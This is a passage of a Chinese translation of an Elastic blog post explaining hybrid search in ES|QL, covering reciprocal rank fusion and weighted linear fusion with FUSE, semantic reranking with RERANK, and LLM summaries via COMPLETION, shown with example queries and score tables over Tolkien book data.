<p>在我们的示例中，我们使用 RRF。第一步，FUSE 使用 RRF 公式为每一行分配新的分数：</p>
<pre><code class="hljs language-scss" lang="scss">`<span class="hljs-built_in">score</span>(doc) = <span class="hljs-number">1</span> / (rank_constant + rank(doc))`AI写代码
</code></pre>
<p>其中 rank_constant 的默认值为 60，rank(doc) 表示文档在结果集中的位置。</p>
<p>在第一阶段，我们的结果变为：</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th><th>_fork</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>1 / (60 + 1) = 0.01639</td><td>fork1</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>1 / (60 + 2) = 0.01613</td><td>fork1</td></tr><tr><td>4005</td><td>The Two Towers</td><td>1 / (60 + 3) = 0.01587</td><td>fork1</td></tr><tr><td>4006</td><td>The Return of the King</td><td>1 / (60 + 4) = 0.01563</td><td>fork1</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>1 / (60 + 5) = 0.01538</td><td>fork1</td></tr><tr><td>4144</td><td>The Children of Húrin</td><td>1 / (60 + 6) = 0.01515</td><td>fork1</td></tr><tr><td>4001</td><td>The Hobbit</td><td>1 / (60 + 1) = 0.01639</td><td>fork2</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>1 / (60 + 2) = 0.01613</td><td>fork2</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>1 / (60 + 3) = 0.01587</td><td>fork2</td></tr><tr><td>4005</td><td>The Two Towers</td><td>1 / (60 + 4) = 0.01563</td><td>fork2</td></tr><tr><td>4006</td><td>The Return of the King</td><td>1 / (60 + 5) = 0.01538</td><td>fork2</td></tr></tbody></table>
<p>然后这些行会被合并，并分配新的分数。由于 FUSE 命令后跟 SORT _score DESC，最终结果为：</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.01639 + 0.01639 = 0.03279</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.01613 + 0.01613 = 0.03226</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.01587 + 0.01563 = 0.0315</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.01538 + 0.01587 = 0.03125</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.01563 + 0.01538 = 0.03101</td></tr><tr><td>4144</td><td>The Children of Húrin</td><td>0.01515</td></tr></tbody></table>
<h3 data-id="heading-3">混合搜索：scores 的线性组合</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Frest-apis%2Freciprocal-rank-fusion" title="https://www.elastic.co/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion" target="_blank" ref="nofollow noopener noreferrer">Reciprocal rank fusion</a> 是执行 hybrid search 最简单的方法，但它不是我们在 ES|QL 中支持的唯一 hybrid search 方法。</p>
<p>在下面的示例中，我们使用 FUSE 通过 scores 的线性组合来合并 lexical 和 semantic search 结果：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(semantic_description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE LINEAR <span class="hljs-keyword">WITH</span> { "weights": { "fork1": <span class="hljs-number">0.7</span>, "fork2": <span class="hljs-number">0.3</span> } }
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AI写代码
</code></pre>
<p>让我们先分解查询，并查看当只运行 FORK 命令时 FUSE 命令的输入。</p>
<p>注意，我们使用 match 函数，它不仅可以查询 lexical 字段，如 text 或 keyword，还可以查询 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Fmapping-reference%2Fsemantic-text" title="https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/semantic-text" target="_blank" ref="nofollow noopener noreferrer">semantic_text</a> 字段。</p>
<p>第一个 FORK 分支通过查询 semantic_text 字段执行 semantic query，而第二个分支执行 lexical query：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(semantic_description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)

`AI写代码
</code></pre>
<p>FORK 命令的输出可能包含具有相同 _id 和 _index 值的行，这些行表示同一个 Elasticsearch 文档：</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th><th>_fork</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.88</td><td>fork1</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.88</td><td>fork1</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.86</td><td>fork1</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.84</td><td>fork1</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.78</td><td>fork1</td></tr><tr><td>4144</td><td>The Children of Húrin</td><td>0.79</td><td>fork1</td></tr><tr><td>4001</td><td>The Hobbit</td><td>4.55</td><td>fork2</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>4.25</td><td>fork2</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>4.11</td><td>fork2</td></tr><tr><td>4005</td><td>The Two Towers</td><td>3.8</td><td>fork2</td></tr><tr><td>4006</td><td>The Return of the King</td><td>4.1</td><td>fork2</td></tr></tbody></table>
<p>在下一步，我们使用 FUSE 合并具有相同 _id 和 _index 值的行，并分配新的相关性分数。</p>
<p>新的分数是该行在每个 FORK 分支中的分数的线性组合：</p>
<pre><code class="hljs language-ini" lang="ini">`<span class="hljs-attr">_score</span> = <span class="hljs-number">0.7</span> *_score1 + <span class="hljs-number">0.3</span> * _score2`AI写代码
</code></pre>
<p>这里，_score1 和 _score2 分别表示文档在第一个 FORK 分支和第二个 FORK 分支中的分数。</p>
<blockquote>
<p>注意，我们还应用了自定义权重，对 semantic score 给予比 lexical score 更高的权重，得到这一组文档：</p>
</blockquote>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.7 * 0.88 + 0.3 * 4.55 = 1.981</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.7 * 0.88 + 0.3 * 4.25 = 1.891</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.7 * 0.84 + 0.3 * 4.1 = 1.818</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.7 * 0.78 + 0.3 * 4.11 = 1.779</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.7 * 0.86 + 0.3 * 3.8 = 1.742</td></tr><tr><td>4144</td><td>The Children of Húrin</td><td>0.7 * 0.79 + 0.3 * 0 = 0.553</td></tr></tbody></table>
<p>一个挑战是 semantic score 和 lexical score 可能不兼容直接进行线性组合，因为它们可能遵循完全不同的分布。为缓解这一问题，我们首先需要对分数进行归一化，使用 score normalization 方法，如 minmax。这样可以确保每个 FORK 分支的分数在应用线性组合公式前先被归一化到 0 到 1 之间的值。</p>
<p>要使用 FUSE 实现这一点，我们需要指定 normalizer 选项：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(semantic_description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE LINEAR <span class="hljs-keyword">WITH</span> { "weights": { "fork1": <span class="hljs-number">0.7</span>, "fork2": <span class="hljs-number">0.3</span> }, "normalizer": "minmax" }
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AI写代码
</code></pre>
<h3 data-id="heading-4">Semantic reranking</h3>
<p>在这一阶段，经过 hybrid search 后，我们应该只剩下最相关的文档。我们现在可以使用 semantic <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F143352429" title="https://elasticstack.blog.csdn.net/article/details/143352429" target="_blank" ref="nofollow noopener noreferrer">reranking</a> 通过 RERANK 命令重新排序结果。默认情况下，RERANK 使用最新的 Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Franking%2Fsemantic-reranking" title="https://www.elastic.co/docs/solutions/search/ranking/semantic-reranking" target="_blank" ref="nofollow noopener noreferrer">semantic reranking</a> 机器学习模型，因此无需额外配置：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">6.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>
<span class="hljs-number">7.</span>  <span class="hljs-operator">|</span> RERANK ?query <span class="hljs-keyword">ON</span> description
<span class="hljs-number">8.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AI写代码
</code></pre>
<p>我们现在得到了按相关性排序的最佳结果。</p>
<p>RERANK 命令区别于其他提供 semantic reranking 集成的产品的一个关键特性是，它不要求输入必须是索引中的映射字段。RERANK 只需要一个能求值为字符串的表达式，因此可以使用多个字段进行 semantic reranking：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">6.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>
<span class="hljs-number">7.</span>  <span class="hljs-operator">|</span> RERANK ?query <span class="hljs-keyword">ON</span> CONCAT(title, "\n", description) 
<span class="hljs-number">8.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AI写代码
</code></pre>
<h2 data-id="heading-5">LLM completions</h2>
<p>现在我们有了一组高度相关、重新排序的结果。</p>
<p>在这一阶段，你可以选择直接将结果返回给你的应用，也可以使用 LLM completions 进一步增强结果。</p>
<p>如果你在 retrieval-augmented generation (<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F134396254" title="https://elasticstack.blog.csdn.net/article/details/134396254" target="_blank" ref="nofollow noopener noreferrer">RAG</a>) 工作流中使用 ES|QL，你可以选择直接从 ES|QL 调用你喜欢的 LLM。<br/>
为此，我们新增了 COMPLETION 命令，它接受一个 prompt、一个 completion <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Felastic-inference" title="https://www.elastic.co/docs/explore-analyze/elastic-inference" target="_blank" ref="nofollow noopener noreferrer">inference</a> ID（指定调用哪个 LLM）以及一个列标识符（指定 LLM 响应输出到哪一列）。</p>
<p>在下面的示例中，我们使用 COMPLETION 添加了一个新的 _completion 列，其中包含 content 列的摘要：</p>
<pre><code class="hljs language-sql" lang="sql">`<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">6.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>
<span class="hljs-number">7.</span>  <span class="hljs-operator">|</span> RERANK ?query <span class="hljs-keyword">ON</span> description
<span class="hljs-number">8.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">9.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">10</span>
<span class="hljs-number">10.</span>  <span class="hljs-operator">|</span> COMPLETION CONCAT("Summarize the following:\n", description) <span class="hljs-keyword">WITH</span> { "inference_id" : "my_inference_endpoint" }` AI写代码<span class="hljs-operator">!</span>[](https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>csdnimg.cn<span class="hljs-operator">/</span><span class="hljs-keyword">release</span><span class="hljs-operator">/</span>blogv2<span class="hljs-operator">/</span>dist<span class="hljs-operator">/</span>pc<span class="hljs-operator">/</span>img<span class="hljs-operator">/</span>runCode<span class="hljs-operator">/</span>icon<span class="hljs-operator">-</span>arrowwhite.png)
</code></pre>
<p>每一行现在都包含一个摘要：</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th><th>summary</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.03279</td><td>Bilbo helps dwarves reclaim Erebor from the dragon Smaug.</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.03226</td><td>Frodo begins the quest to destroy the One Ring.</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.0315</td><td>The Fellowship splits; war comes to Rohan; Frodo nears Mordor.</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.03125</td><td>Ancient myths and history of Middle-earth's First Age.</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.3101</td><td>Sauron is defeated and Aragorn is crowned King.</td></tr><tr><td>4144</td><td>The Children of Húrin</td><td>0.01515</td><td>The tragic tale of Túrin Turambar's cursed life.</td></tr></tbody></table>
<p>在另一种用例中，你可能只是想使用自己在 Elasticsearch 中索引的专有数据来回答问题。在这种情况下，我们在前一阶段计算出的最佳搜索结果可以作为 prompt 的上下文：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">6.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>
<span class="hljs-number">7.</span>  <span class="hljs-operator">|</span> RERANK ?query <span class="hljs-keyword">ON</span> description
<span class="hljs-number">8.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">9.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">10</span>
<span class="hljs-number">10.</span>  <span class="hljs-operator">|</span> STATS context <span class="hljs-operator">=</span> <span class="hljs-keyword">VALUES</span>(CONCAT(title, "\n", description)
<span class="hljs-number">11.</span>  <span class="hljs-operator">|</span> COMPLETION CONCAT("Answer the following question ", ?query, "based on:\n", context) <span class="hljs-keyword">WITH</span> { "inference_id" : "my_inference_endpoint" }

`AI写代码<span class="hljs-operator">!</span>[](https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>csdnimg.cn<span class="hljs-operator">/</span><span class="hljs-keyword">release</span><span class="hljs-operator">/</span>blogv2<span class="hljs-operator">/</span>dist<span class="hljs-operator">/</span>pc<span class="hljs-operator">/</span>img<span class="hljs-operator">/</span>runCode<span class="hljs-operator">/</span>icon<span class="hljs-operator">-</span>arrowwhite.png)
</code></pre>
<p>由于 COMPLETION 命令解锁了向 LLM 发送任意 prompt 的能力，可能性是无穷的。虽然我们只展示了一些示例，但 COMPLETION 命令可以用于各种场景，从安全分析师根据日志事件是否可能表示恶意行为来分配分数，到数据科学家用它分析数据，甚至到仅仅<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F150973787" title="https://elasticstack.blog.csdn.net/article/details/150973787" target="_blank" ref="nofollow noopener noreferrer">根据你的数据生成 Chuck Norris 事实</a>的情况。</p>
<h2 data-id="heading-6">这只是开始</h2>
<p>未来，我们将扩展 ES|QL，以改进长文档的 semantic reranking，更好地使用多个 FORK 命令进行 ES|QL 查询的条件执行，支持 sparse vector 查询，去除近似重复结果以提高结果多样性，允许对运行时生成的列进行全文搜索，以及更多其他场景。</p>
<p>更多教程和指南：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Fesql-for-search" title="https://www.elastic.co/docs/solutions/search/esql-for-search" target="_blank" ref="nofollow noopener noreferrer">ES|QL for search</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fesql-search-tutorial" title="https://www.elastic.co/docs/reference/query-languages/esql/esql-search-tutorial" target="_blank" ref="nofollow noopener noreferrer">ES|QL for search tutorial</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Fmapping-reference%2Fsemantic-text" title="https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/semantic-text" target="_blank" ref="nofollow noopener noreferrer">Semantic_text field type</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fcommands%2Ffork" title="https://www.elastic.co/docs/reference/query-languages/esql/commands/fork" target="_blank" ref="nofollow noopener noreferrer">FORK</a> and <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fcommands%2Ffuse" title="https://www.elastic.co/docs/reference/query-languages/esql/commands/fuse" target="_blank" ref="nofollow noopener noreferrer">FUSE</a> 文档</li>
<li>ES|QL search functions</li>
</ul>
<p>原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Fhybrid-search-multi-stage-retrieval-esql" title="https://www.elastic.co/search-labs/blog/hybrid-search-multi-stage-retrieval-esql" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labs…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端向架构突围系列 - 框架设计（三）：用开闭原则拯救你的组件库]]></title>    <link>https://juejin.cn/post/7592996072705163314</link>    <guid>https://juejin.cn/post/7592996072705163314</guid>    <pubDate>2026-01-09T03:42:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705163314" data-draft-id="7592906873089441838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端向架构突围系列 - 框架设计（三）：用开闭原则拯救你的组件库"/> <meta itemprop="keywords" content="前端,架构"/> <meta itemprop="datePublished" content="2026-01-09T03:42:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端王壮壮"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端向架构突围系列 - 框架设计（三）：用开闭原则拯救你的组件库
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端王壮壮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:42:59.000Z" title="Fri Jan 09 2026 03:42:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body 